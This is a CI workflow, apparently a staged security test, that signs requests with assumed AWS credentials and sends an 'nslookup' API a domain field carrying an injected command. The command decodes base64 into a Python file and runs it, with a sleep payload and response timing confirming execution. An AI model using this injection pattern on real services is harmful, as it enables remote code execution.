name: Stage2-Test-Base64

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Test Base64 decoding inside Lambda
        shell: bash
        run: |
          set +e

          python3 -m pip install boto3 requests requests-aws4auth --quiet

          python3 - <<'PY'
          import base64
          import shlex
          import time
          import requests
          import boto3
          from requests_aws4auth import AWS4Auth

          API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          script = "import time; time.sleep(2)"
          encoded = base64.b64encode(script.encode()).decode()

          credentials = boto3.Session().get_credentials().get_frozen_credentials()

          auth = AWS4Auth(
              credentials.access_key,
              credentials.secret_key,
              "us-east-1",
              "execute-api",
              session_token=credentials.token
          )

          command = (
              "example.com; "
              "printf '%s' "
              + shlex.quote(encoded)
              + " | base64 -d > /tmp/test.py; "
              + "python3 /tmp/test.py; #"
          )

          started = time.monotonic()

          response = requests.post(
              API,
              json={"domain": command},
              auth=auth,
              timeout=20
          )

          elapsed = time.monotonic() - started

          print("HTTP=" + str(response.status_code))
          print("ELAPSED=%.2f" % elapsed)
          print(response.text)
          PY
